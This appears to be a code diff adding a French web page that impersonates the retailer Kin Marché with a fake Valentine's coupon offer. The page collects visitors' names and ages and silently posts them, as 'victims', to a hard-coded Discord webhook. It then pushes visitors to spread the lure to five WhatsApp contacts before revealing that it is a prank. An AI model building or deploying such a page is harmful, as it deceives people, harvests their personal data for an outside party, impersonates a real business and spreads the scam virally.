@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="🍫 PROMO KIN MARCHÉ : -85% SUR TOUT !">
+    <meta property="og:description" content="Offre Saint-Valentin exclusive ! Obtenez votre coupon de réduction immédiatement après validation.">
+    <meta property="og:image" content="logo.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+
+    <title>Kin Marché - Promo Officielle</title>
+    <style>
+        :root { --km-orange: #f26522; --km-blue: #0054a6; }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: #001220; color: white; overflow-x: hidden; }
+        
+        /* FOND INTERACTIF */
+        #bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: linear-gradient(135deg, #001220 0%, #0054a6 100%); }
+        .floating { position: absolute; color: rgba(255,255,255,0.15); font-size: 24px; animation: move 8s linear infinite; pointer-events: none; }
+        @keyframes move { from { transform: translateY(110vh) rotate(0deg); } to { transform: translateY(-10vh) rotate(360deg); } }
+
+        .container { width: 85%; max-width: 380px; background: white; color: #333; margin: 40px auto; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 1rem; }
+        .btn { background: var(--km-orange); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; }
+        .progress-container { display: none; background: #e9edef; border-radius: 10px; height: 14px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { background: #25D366; width: 0%; height: 100%; transition: 0.5s ease-in-out; }
+        #final-step { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="bg-animation"></div>
+
+<div class="container" id="step1">
+    <img src="logo.png" style="width:140px; margin-bottom:15px;" alt="Kin Marché">
+    <h2 style="color:var(--km-blue); margin-top:0;">PROMO ST VALENTIN</h2>
+    <p style="color:#666;">Entrez vos détails pour recevoir votre bon de <b>-85%</b> à la caisse.</p>
+    <input type="text" id="name" placeholder="Nom et Post-nom" required>
+    <input type="number" id="age" placeholder="Âge" required>
+    <button class="btn" onclick="sendToDiscord()">GÉNÉRER MON COUPON</button>
+</div>
+
+<div class="container" id="step2" style="display:none;">
+    <h2 style="color:var(--km-blue)">Vérification... ✅</h2>
+    <p>Profil éligible ! Pour afficher votre code promo, partagez cette offre avec <b>5 amis ou groupes WhatsApp</b>.</p>
+    <div class="progress-container" id="p-box" style="display:block;">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+    <p id="status" style="font-weight:bold; color:#25D366">0% Partagé</p>
+    <button class="btn" style="background:#25D366" onclick="shareWA()">PARTAGER SUR WHATSAPP</button>
+</div>
+
+<div class="container" id="final-step">
+    <h1 style="color:red; margin:0;">🤡 PIÉGÉ !</h1>
+    <p style="font-size:1.1rem;">Y'a pas de promo, c'est une blague de <b>OLY</b> !</p>
+    <p>Ton code de victime : <br><b style="font-size:1.5rem; color:var(--km-blue);">KM-VAL-2026</b></p>
+    <button class="btn" style="background:black" onclick="window.location.href='https://wa.me/243819679859?text=Oly tu es un génie, j'ai cru aux chocolats de Kin Marché 😂'">SE VENGER SUR WHATSAPP</button>
+</div>
+
+<script>
+    // 1. FOND ANIMÉ
+    const bg = document.getElementById('bg-animation');
+    const items = ['❤️', '🍫', '🛍️', '🎁'];
+    for(let i=0; i<15; i++) {
+        let el = document.createElement('div');
+        el.className = 'floating';
+        el.innerText = items[Math.floor(Math.random()*items.length)];
+        el.style.left = Math.random() * 100 + 'vw';
+        el.style.animationDuration = (Math.random() * 4 + 6) + 's';
+        el.style.animationDelay = Math.random() * 5 + 's';
+        bg.appendChild(el);
+    }
+
+    // 2. ENVOI DISCORD
+    function sendToDiscord() {
+        const name = document.getElementById('name').value;
+        const age = document.getElementById('age').value;
+        const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+
+        if(!name || !age) return alert("Veuillez remplir tous les champs.");
+
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🎥 Nouvelle Victime Kin Marché !",
+                    color: 15897122,
+                    fields: [
+                        { name: "👤 Nom", value: name, inline: true },
+                        { name: "🎂 Âge", value: age, inline: true }
+                    ],
+                    footer: { text: "By Oly Prank System" }
+                }]
+            })
+        }).then(() => {
+            document.getElementById('step1').style.display = "none";
+            document.getElementById('step2').style.display = "block";
+        });
+    }
+
+    // 3. LOGIQUE PARTAGE
+    let p = 0;
+    function shareWA() {
+        window.open(`whatsapp://send?text=🍫 Vite ! Kin Marché offre des bons de -85% pour la Saint-Valentin ! J'ai déjà validé mon nom, regarde ici : ${window.location.href}`);
+        p += 25;
+        document.getElementById('bar').style.width = p + "%";
+        document.getElementById('status').innerText = p + "% Partagé";
+        if(p >= 100) {
+            document.getElementById('step2').style.display = "none";
+            document.getElementById('final-step').style.display = "block";
+        }
+    }
+</script>
+
+</body>
+</html>
